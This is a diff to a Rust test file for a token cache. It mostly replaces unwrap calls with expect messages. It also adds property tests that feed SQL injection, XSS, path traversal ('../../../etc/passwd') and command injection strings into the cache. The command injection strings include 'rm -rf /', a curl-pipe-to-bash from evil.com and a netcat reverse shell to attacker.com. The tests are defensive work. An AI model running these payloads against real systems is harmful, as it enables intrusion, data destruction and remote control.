@@ -82,7 +82,7 @@ fn test_token_cache_capacity_limits() {
                 Ok(())
             })
         })
-        .unwrap();
+        .expect("Token cache capacity test failed");
 }
 
 #[test]
@@ -112,10 +112,11 @@ fn test_token_cache_expiration() {
                             i64::try_from(
                                 SystemTime::now()
                                     .duration_since(UNIX_EPOCH)
-                                    .unwrap()
+                                    .expect("System time should be after UNIX epoch")
                                     .as_secs()
-                                    .saturating_sub(3600)
-                            ).unwrap_or(0),
+                                    .saturating_sub(3600),
+                            )
+                            .unwrap_or(0),
                         );
                     }
                     cache.insert(key, token).await;
@@ -126,7 +127,7 @@ fn test_token_cache_expiration() {
                 Ok(())
             })
         })
-        .unwrap();
+        .expect("Token cache expiration test failed");
 }
 
 #[test]
@@ -170,7 +171,7 @@ fn test_cache_access_patterns() {
                 Ok(())
             })
         })
-        .unwrap();
+        .expect("Cache access patterns test failed");
 }
 
 #[test]
@@ -228,7 +229,7 @@ fn test_cache_concurrent_access() {
                 Ok(())
             })
         })
-        .unwrap();
+        .expect("Cache concurrent access test failed");
 }
 
 /// Integration test for session store with property-based testing
@@ -264,6 +265,320 @@ mod session_store_tests {
 mod security_property_tests {
     use super::*;
     // use proptest_regex::RegexGenerator; // Not required
+
+    /// Test for SQL injection patterns in input data
+    #[test]
+    fn test_sql_injection_resistance() {
+        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
+            cases: 1000,
+            max_shrink_iters: 1000,
+            timeout: 10000,
+            ..ProptestConfig::default()
+        });
+
+        let sql_injection_patterns = vec![
+            "' OR '1'='1",
+            "'; DROP TABLE users; --",
+            "1' UNION SELECT * FROM users --",
+            "' OR 1=1 --",
+            "admin' --",
+            "' OR 'x'='x",
+            "1; SELECT * FROM information_schema.tables;",
+            "'; EXEC xp_cmdshell('dir'); --",
+            "UNION SELECT password FROM users WHERE '1'='1",
+            "1' AND 1=1 UNION SELECT username, password FROM users --",
+        ];
+
+        let strategy = proptest::sample::select(sql_injection_patterns);
+
+        runner
+            .run(&strategy, |sql_payload| {
+                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
+                rt.block_on(async move {
+                    let config = TokenCacheConfig::default();
+                    let cache = LruTokenCache::with_config(config);
+
+                    // Create a token record with potentially malicious data
+                    let malicious_token = TokenRecord {
+                        active: true,
+                        scope: Some(sql_payload.to_string()),
+                        client_id: Some(sql_payload.to_string()),
+                        exp: Some(1_234_567_890),
+                        iat: Some(1_234_567_800),
+                        sub: Some(sql_payload.to_string()),
+                        token_binding: Some(sql_payload.to_string()),
+                        mfa_verified: false,
+                    };
+
+                    // The cache should handle this without crashing or SQL injection
+                    cache.insert(sql_payload.to_string(), malicious_token).await;
+
+                    // Verify we can retrieve it
+                    let retrieved = cache.get(sql_payload).await;
+                    prop_assert!(
+                        retrieved.is_some(),
+                        "Cache should handle malicious input gracefully"
+                    );
+
+                    Ok(())
+                })
+            })
+            .expect("SQL injection resistance test failed");
+    }
+
+    /// Test for XSS patterns in input data
+    #[test]
+    fn test_xss_pattern_resistance() {
+        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
+            cases: 500,
+            max_shrink_iters: 500,
+            timeout: 8000,
+            ..ProptestConfig::default()
+        });
+
+        let xss_patterns = vec![
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<a href='javascript:alert(\"XSS\")'>Click me</a>",
+            "<div style='background-image: url(javascript:alert(\"XSS\"))'>",
+            "<meta http-equiv='refresh' content='0; url=javascript:alert(\"XSS\")'>",
+            "<object data='javascript:alert(\"XSS\")'>",
+            "<embed src='javascript:alert(\"XSS\")'>",
+        ];
+
+        let strategy = proptest::sample::select(xss_patterns);
+
+        runner
+            .run(&strategy, |xss_payload| {
+                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
+                rt.block_on(async move {
+                    let config = TokenCacheConfig::default();
+                    let cache = LruTokenCache::with_config(config);
+
+                    let malicious_token = TokenRecord {
+                        active: true,
+                        scope: Some(xss_payload.to_string()),
+                        client_id: Some(xss_payload.to_string()),
+                        exp: Some(1_234_567_890),
+                        iat: Some(1_234_567_800),
+                        sub: Some(xss_payload.to_string()),
+                        token_binding: Some(xss_payload.to_string()),
+                        mfa_verified: false,
+                    };
+
+                    cache
+                        .insert(format!("safe_key_{}", xss_payload.len()), malicious_token)
+                        .await;
+                    Ok(())
+                })
+            })
+            .expect("XSS pattern resistance test failed");
+    }
+
+    /// Test for path traversal patterns
+    #[test]
+    fn test_path_traversal_resistance() {
+        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
+            cases: 300,
+            max_shrink_iters: 300,
+            timeout: 6000,
+            ..ProptestConfig::default()
+        });
+
+        let path_traversal_patterns = vec![
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "....//....//....//etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "/absolute/path/../../../root",
+            "valid/path/../../../secret",
+            "..\\..\\..\\secret.txt",
+            ".../...//secret",
+            "\u{2e}\u{2e}\u{2f}\u{2e}\u{2e}\u{2f}\u{2e}\u{2e}\u{2f}etc\u{2f}passwd", // Unicode
+        ];
+
+        let strategy = proptest::sample::select(path_traversal_patterns);
+
+        runner
+            .run(&strategy, |path_payload| {
+                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
+                rt.block_on(async move {
+                    let config = TokenCacheConfig::default();
+                    let cache = LruTokenCache::with_config(config);
+
+                    let malicious_token = TokenRecord {
+                        active: true,
+                        scope: Some(path_payload.to_string()),
+                        client_id: Some(path_payload.to_string()),
+                        exp: Some(1_234_567_890),
+                        iat: Some(1_234_567_800),
+                        sub: Some(path_payload.to_string()),
+                        token_binding: Some(path_payload.to_string()),
+                        mfa_verified: false,
+                    };
+
+                    // Use a safe key, but store malicious data
+                    cache
+                        .insert(format!("safe_key_{}", path_payload.len()), malicious_token)
+                        .await;
+                    Ok(())
+                })
+            })
+            .expect("Path traversal resistance test failed");
+    }
+
+    /// Test for command injection patterns
+    #[test]
+    fn test_command_injection_resistance() {
+        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
+            cases: 200,
+            max_shrink_iters: 200,
+            timeout: 5000,
+            ..ProptestConfig::default()
+        });
+
+        let command_injection_patterns = vec![
+            "; rm -rf /",
+            "| cat /etc/passwd",
+            "`cat /etc/passwd`",
+            "$(rm -rf /)",
+            "; ls -la",
+            "| id",
+            "`whoami`",
+            "$(uname -a)",
+            "; curl http://evil.com/malware.sh | bash",
+            "| nc -e /bin/sh attacker.com 4444",
+        ];
+
+        let strategy = proptest::sample::select(command_injection_patterns);
+
+        runner
+            .run(&strategy, |cmd_payload| {
+                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
+                rt.block_on(async move {
+                    let config = TokenCacheConfig::default();
+                    let cache = LruTokenCache::with_config(config);
+
+                    let malicious_token = TokenRecord {
+                        active: true,
+                        scope: Some(cmd_payload.to_string()),
+                        client_id: Some(cmd_payload.to_string()),
+                        exp: Some(1_234_567_890),
+                        iat: Some(1_234_567_800),
+                        sub: Some(cmd_payload.to_string()),
+                        token_binding: Some(cmd_payload.to_string()),
+                        mfa_verified: false,
+                    };
+
+                    cache
+                        .insert(format!("safe_key_{}", cmd_payload.len()), malicious_token)
+                        .await;
+                    Ok(())
+                })
+            })
+            .expect("Command injection resistance test failed");
+    }
+
+    /// Test for extremely long inputs that could cause `DoS`
+    #[test]
+    fn test_extremely_long_input_handling() {
+        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
+            cases: 10,
+            max_shrink_iters: 10,
+            timeout: 15000,
+            ..ProptestConfig::default()
+        });
+
+        // Generate extremely long strings
+        let strategy = prop::collection::vec(prop::char::any(), 10000..100_000);
+
+        runner
+            .run(&strategy, |long_input_vec| {
+                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
+                rt.block_on(async move {
+                    let long_string: String = long_input_vec.into_iter().collect();
+                    let config = TokenCacheConfig::default();
+                    let cache = LruTokenCache::with_config(config);
+
+                    let malicious_token = TokenRecord {
+                        active: true,
+                        scope: Some(long_string.clone()),
+                        client_id: Some(long_string.clone()),
+                        exp: Some(1_234_567_890),
+                        iat: Some(1_234_567_800),
+                        sub: Some(long_string.clone()),
+                        token_binding: Some(long_string.clone()),
+                        mfa_verified: false,
+                    };
+
+                    // Test with truncated key to avoid key length issues
+                    let key = format!("key_{}", long_string.len() % 1000);
+                    cache.insert(key, malicious_token).await;
+                    Ok(())
+                })
+            })
+            .expect("Extremely long input handling test failed");
+    }
+
+    /// Test for null bytes and control characters
+    #[test]
+    fn test_null_byte_and_control_char_handling() {
+        let mut runner = proptest::test_runner::TestRunner::new(ProptestConfig {
+            cases: 100,
+            max_shrink_iters: 100,
+            timeout: 3000,
+            ..ProptestConfig::default()
+        });
+
+        let malicious_chars = vec![
+            '\0',       // null byte
+            '\x01',     // SOH
+            '\x02',     // STX
+            '\x03',     // ETX
+            '\x04',     // EOT
+            '\x1F',     // US (unit separator)
+            '\x7F',     // DEL
+            '\u{80}',   // high ASCII
+            '\u{202E}', // RTL override
+            '\u{200E}', // LTR mark
+        ];
+
+        let strategy = proptest::sample::select(malicious_chars);
+
+        runner
+            .run(&strategy, |malicious_char| {
+                let rt = tokio::runtime::Runtime::new().expect("create tokio rt");
+                rt.block_on(async move {
+                    let config = TokenCacheConfig::default();
+                    let cache = LruTokenCache::with_config(config);
+
+                    let malicious_string = format!("malicious{malicious_char}data");
+                    let malicious_token = TokenRecord {
+                        active: true,
+                        scope: Some(malicious_string.clone()),
+                        client_id: Some(malicious_string.clone()),
+                        exp: Some(1_234_567_890),
+                        iat: Some(1_234_567_800),
+                        sub: Some(malicious_string.clone()),
+                        token_binding: Some(malicious_string.clone()),
+                        mfa_verified: false,
+                    };
+
+                    cache
+                        .insert(
+                            format!("safe_key_{}", malicious_char as u32),
+                            malicious_token,
+                        )
+                        .await;
+                    Ok(())
+                })
+            })
+            .expect("Null byte and control character handling test failed");
+    }
 
     #[test]
     fn test_cache_resilience_to_malformed_data() {
@@ -306,7 +621,7 @@ mod security_property_tests {
                     Ok(())
                 })
             })
-            .unwrap();
+            .expect("Cache resilience to malformed data test failed");
     }
 }
 
